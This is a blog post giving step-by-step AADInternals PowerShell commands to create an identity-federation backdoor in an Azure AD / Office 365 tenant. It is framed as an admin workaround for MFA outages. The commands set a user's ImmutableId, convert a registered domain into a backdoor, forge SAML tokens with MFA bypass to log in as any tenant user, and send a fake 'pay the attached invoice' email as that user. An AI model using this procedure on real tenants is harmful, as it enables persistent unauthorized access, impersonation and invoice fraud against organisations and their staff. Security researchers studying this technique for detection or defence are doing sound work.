+++
title = "How to create a backdoor to Azure AD - part 1: Identity federation"
date = "2018-11-21"
lastmod = "2020-08-05"
categories =["blog"]
tags = ["Azure Active Directory","PowerShell","AADInternals","Security"]
thumbnail = "/images/posts/backdoor_i.png"
+++

On November 2018 Azure AD MFA was down over 12 hours preventing users from logging in to Office 365. Same happened in October 2019 in US data centers.
As MFA is usually mandatory for administrators by company policy, they couldn’t log in either. 
In this blog, I’ll show how to create a backdoor to Azure AD so you can log in and bypass MFA. 

<!--more-->
Microsoft has pushed organisations to use Azure AD Multi-Factor Authentication (MFA) to increase the security of their cloud offering. 
On November 2018 the <a href="/images/posts/mfa_down.png" target="_blank">MFA service was down</a> worldwide for over 12 hours, and <a href="/images/posts/mfa_down2.png" target="_blank">two hours</a> on 2019 in the US.

How can admins log in if something similar happens? The answer is: using a backdoor. Here is how to create one - see my <a href="/post/aad-deepdive/" target="_blank">blog</a> for technical details.

**Note!** In this blog, I'm using the **<a href="/aadinternals" target="_new">AADInternals</a>** PowerShell module. 

# Prerequisities
The backdoor utilises a known <a href="/post/federation-vulnerability/" target="_post">identity federation ~~vulnerability~~ feature</a> I blogged on 2017. 
To create a backdoor, all you need is a user with Global Admin access to Azure AD / Office 365 tenant and <a href="/aadinternals" target="_blank">AADInternals</a> PowerShell module.

## Preparing the users
The backdoor requires that the account to be impersonated has an **ImmutableID** attribute set. 
If the account is synced from on-premises, the attribute contains a base64 encoded GUID of user's on-prem AD object. 
If the account is not synced, you need to set it manually. The value can be basically any string, as long as it is unique within the tenant.

To set the ImmutableId, use the following commands
{{< highlight powershell >}}
# Get AccessToken
$at=Get-AADIntAccessTokenForAADGraph

# Set the ImmutableId
Set-AADIntUser -UserPrincipalName "admin@company.onmicrosoft.com" -ImmutableId "AADBackdoor" -AccessToken $at
{{< /highlight>}}

## Creating a backdoor
To create a backdoor, you need a registered domain which will be converted to a backdoor. You can get one domain free from <a href="www.myo365.site" target="_blank">www.myo365.site</a>.

After registering a domain, for example **company.myo365.site**, you can create a backdoor:

{{< highlight powershell >}}
# Convert an existing domain to a backdoor
ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "company.myo365.site"
{{< /highlight>}}

**Output:**
```
Are you sure to create backdoor with microsoft.com? Type YES to continue or CTRL+C to abort: YES

IssuerUri               Domain              
---------               ------              
http://any.sts/23748688 company.myo365.site
```
# Use the backdoor

There are two ways to use the created backdoor. You can either open the Office 365 portal, or create a SAML tokens and use it with other AADInternals functions.

## Open the Office 365 portal
{{< highlight powershell >}}
# Open the Office 365 portal in an Internet Explorer InPrivate -session
Open-AADIntOffice365Portal -ImmutableId "AADBackdoor" -Issuer "http://any.sts/AE7A094C" -ByPassMFA $true -UseBuiltInCertificate
{{< /highlight>}}

You should now see the html page as below. Click the **Login to Office 365** button to log in! 
You can also view the source code of the page to see what the SAML token contains.

![screenshot](/images/posts/backdoor.png)


## Create a SAML token and send email using Outlook API
{{< highlight powershell >}}
# Create a SAML token
$token=New-AADIntSAMLToken -ImmutableId "AADBackdoor" -Issuer "http://any.sts/AE7A094C" -ByPassMFA $true -UseBuiltInCertificate

# Get an access token for Exchange Online
$et=Get-AADIntAccessTokenForEXO -SAMLToken $token

# Send an email using Outlook API
Send-AADIntOutlookMessage -AccessToken $et -Recipient "accounting@company.com" -Subject "Invoice" -Message "Pay the attached invoice <b>ASAP!</b>"
{{< /highlight>}}

# Afterword
 
Now you have a backdoor which you can use to access Office 365 - even if the MFA service is down. Conditional access may still block the access for other reasons. 

**Note!** The backdoor allows you to log in as ANY USER of the tenant, as long as the user's **ImmutableId** is known.
